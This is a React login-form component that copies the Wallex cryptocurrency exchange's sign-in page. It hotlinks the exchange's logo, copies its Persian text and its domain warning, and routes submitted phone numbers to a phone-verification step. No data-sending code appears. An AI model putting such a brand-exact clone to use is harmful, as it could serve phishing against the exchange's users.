import { useState } from "react";
import { useNavigate } from "react-router-dom";
import { ChevronLeft, ChevronDown, Info, Loader2 } from "lucide-react";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { AlertMessage } from "./AlertMessage";
import { cn } from "@/lib/utils";

export const LoginForm = () => {
  const navigate = useNavigate();
  const [mobileNumber, setMobileNumber] = useState("");
  const [showInviteCode, setShowInviteCode] = useState(false);
  const [inviteCode, setInviteCode] = useState("");
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errors, setErrors] = useState<{
    mobileNumber?: string;
    inviteCode?: string;
  }>({});

  const validateMobileNumber = (number: string): boolean => {
    const mobileRegex = /^09\d{9}$/;
    return mobileRegex.test(number);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrors({});

    const newErrors: { mobileNumber?: string; inviteCode?: string } = {};

    if (!mobileNumber) {
      newErrors.mobileNumber = "شماره همراه الزامی است";
    } else if (!validateMobileNumber(mobileNumber)) {
      newErrors.mobileNumber = "شماره همراه معتبر نیست";
    }

    if (Object.keys(newErrors).length > 0) {
      setErrors(newErrors);
      return;
    }

    setIsSubmitting(true);

    try {
      console.log("Sending SMS to:", { mobileNumber, inviteCode });
      await new Promise((resolve) => setTimeout(resolve, 1000));
      navigate("/verify-phone", {
        state: { phoneNumber: mobileNumber },
      });
    } catch (error) {
      console.error("SMS sending error:", error);
      setErrors({
        mobileNumber: "خطا در ارسال کد تایید. لطفا دوباره تلاش کنید.",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div
      className="w-full max-w-md lg:max-w-[480px] mx-auto"
      style={{
        backgroundColor: "rgb(255, 255, 255)",
        borderRadius: "16px",
      }}
    >
      <div
        className="flex flex-col gap-2"
        style={{
          padding: "20px",
          width: "100%",
        }}
      >
        {/* Header - Exact Wallex Style */}
        <div className="flex justify-between items-center w-full">
          <div className="flex items-center gap-2">
            <Button
              variant="ghost"
              size="icon"
              className="flex-shrink-0 p-0 bg-transparent hover:bg-gray-100"
              style={{
                borderRadius: "50%",
                width: "auto",
                height: "auto",
                padding: "0",
                backgroundColor: "rgba(0, 0, 0, 0)",
              }}
            >
              <ChevronLeft
                style={{
                  width: "24px",
                  height: "24px",
                  color: "rgba(0, 0, 0, 0.6)",
                  cursor: "pointer",
                }}
              />
            </Button>
            <span
              style={{
                fontWeight: "700",
                fontSize: "16px",
                color: "rgb(0, 0, 0)",
              }}
            >
              ورود یا ثبت‌نام
            </span>
          </div>
          <a href="#" className="flex items-center flex-shrink-0">
            <img
              src="https://wallex.ir/_next/image?url=%2Fimages%2Fwallex-logo-v-light.svg&w=256&q=75"
              alt="صرافی خرید فروش ارزهای دیجیتال"
              style={{
                width: "128px",
                height: "24px",
                objectFit: "contain",
              }}
            />
          </a>
        </div>

        {/* Separator - Exact Wallex Style */}
        <hr
          style={{
            borderColor: "rgba(0, 0, 0, 0.2)",
            borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
            marginLeft: "-20px",
            marginRight: "-20px",
            marginTop: "8px",
            marginBottom: "8px",
          }}
        />

        {/* Content */}
        <div className="flex flex-col gap-2" style={{ marginTop: "16px" }}>
          {/* Alert Messages - Exact Wallex Style */}
          <div className="space-y-2">
            <AlertMessage>مطمئن شوید که در دامنه wallex.ir هستید.</AlertMessage>

            <AlertMessage>
              در صورتی که تنظیمات ورود را بر روی ایمیل قرار داده‌اید، کد ورود به
              ایمیل ارسال خواهد شد.
            </AlertMessage>
          </div>

          {/* Form */}
          <form onSubmit={handleSubmit}>
            {/* Mobile Number Input - Exact Wallex Style */}
            <div
              style={{
                display: "inline-flex",
                flexDirection: "column",
                position: "relative",
                verticalAlign: "top",
                width: "100%",
                marginBottom: "16px",
                marginTop: "16px",
              }}
            >
              <label
                htmlFor="mobile-input"
                style={{
                  fontSize: "14px",
                  fontWeight: "500",
                  lineHeight: "24.01px",
                  marginBottom: "8px",
                  textAlign: "right",
                  color: "rgb(0, 0, 0)",
                }}
              >
                شماره همراه را وارد کنید.
              </label>
              <div style={{ position: "relative" }}>
                <Input
                  id="mobile-input"
                  name="mobile_number"
                  type="text"
                  inputMode="numeric"
                  maxLength={11}
                  value={mobileNumber}
                  onChange={(e) => {
                    const value = e.target.value.replace(/[^0-9]/g, "");
                    setMobileNumber(value);
                    if (errors.mobileNumber) {
                      setErrors((prev) => ({
                        ...prev,
                        mobileNumber: undefined,
                      }));
                    }
                  }}
                  className="w-full text-right"
                  style={{
                    borderRadius: "8px",
                    border: errors.mobileNumber
                      ? "1px solid rgb(220, 38, 38)"
                      : "1px solid rgba(0, 0, 0, 0.2)",
                    padding: "10px 12px",
                    fontSize: "14px",
                    textAlign: "right",
                    backgroundColor: "rgb(255, 255, 255)",
                  }}
                  placeholder="09123456789"
                  autoFocus
                  disabled={isSubmitting}
                />
                {errors.mobileNumber && (
                  <p
                    className="text-right mt-1"
                    style={{
                      color: "rgb(220, 38, 38)",
                      fontSize: "12px",
                    }}
                  >
                    {errors.mobileNumber}
                  </p>
                )}
              </div>
            </div>

            {/* Invite Code Toggle Button - Exact Wallex Style */}
            <Button
              type="button"
              onClick={() => setShowInviteCode(!showInviteCode)}
              className="justify-start p-1 mb-1 hover:bg-transparent"
              style={{
                backgroundColor: "rgba(0, 0, 0, 0)",
                border: "none",
                color: "rgb(0, 122, 255)",
                fontSize: "14px",
                fontWeight: "500",
                textTransform: "uppercase",
                padding: "4px",
                marginBottom: "4px",
              }}
            >
              <ChevronDown
                className={cn(
                  "mr-1 transition-transform duration-200",
                  showInviteCode ? "rotate-180" : "",
                )}
                style={{
                  width: "24px",
                  height: "24px",
                  marginLeft: "4px",
                }}
              />
              <span>کد دعوت دارید؟</span>
            </Button>

            {/* Invite Code Section */}
            <div
              className={cn(
                "overflow-hidden transition-all duration-300",
                showInviteCode ? "h-auto visible" : "h-0 invisible",
              )}
            >
              {showInviteCode && (
                <div className="w-full">
                  <Input
                    name="invite_code"
                    type="text"
                    placeholder="کد معرف (اختیاری)"
                    value={inviteCode}
                    onChange={(e) => setInviteCode(e.target.value)}
                    className="w-full text-right"
                    style={{
                      borderRadius: "8px",
                      border: "1px solid rgba(0, 0, 0, 0.2)",
                      padding: "10px 12px",
                      fontSize: "14px",
                      textAlign: "right",
                      backgroundColor: "rgb(255, 255, 255)",
                    }}
                  />
                  <p
                    className="text-right mt-2 flex items-center"
                    style={{
                      color: "rgba(0, 0, 0, 0.6)",
                      fontSize: "12px",
                      lineHeight: "20.004px",
                    }}
                  >
                    <Info
                      className="mr-2"
                      style={{ width: "24px", height: "24px" }}
                    />
                    <span>کد دعوت صرفا در زمان ثبت‌نام قابل استفاده است.</span>
                  </p>
                </div>
              )}
            </div>

            {/* Submit Section - Exact Wallex Style */}
            <div style={{ marginTop: "16px" }}>
              <hr
                style={{
                  borderColor: "rgba(0, 0, 0, 0.2)",
                  borderBottom: "1px solid rgba(0, 0, 0, 0.2)",
                  marginLeft: "-20px",
                  marginRight: "-20px",
                  marginBottom: "16px",
                }}
              />
              <Button
                type="submit"
                disabled={isSubmitting}
                className="w-full"
                style={{
                  backgroundColor: "rgb(23, 29, 38)",
                  color: "rgb(255, 255, 255)",
                  borderRadius: "8px",
                  padding: "10px 16px",
                  fontSize: "14px",
                  fontWeight: "500",
                  textTransform: "uppercase",
                  border: "none",
                  cursor: isSubmitting ? "not-allowed" : "pointer",
                  opacity: isSubmitting ? "0.5" : "1",
                }}
              >
                {isSubmitting ? (
                  <div className="flex items-center justify-center">
                    <Loader2
                      className="animate-spin mr-2"
                      style={{ width: "16px", height: "16px" }}
                    />
                    <span>در حال ارسال کد...</span>
                  </div>
                ) : (
                  "ثبت و ادامه"
                )}
              </Button>
            </div>
          </form>
        </div>
      </div>
    </div>
  );
};
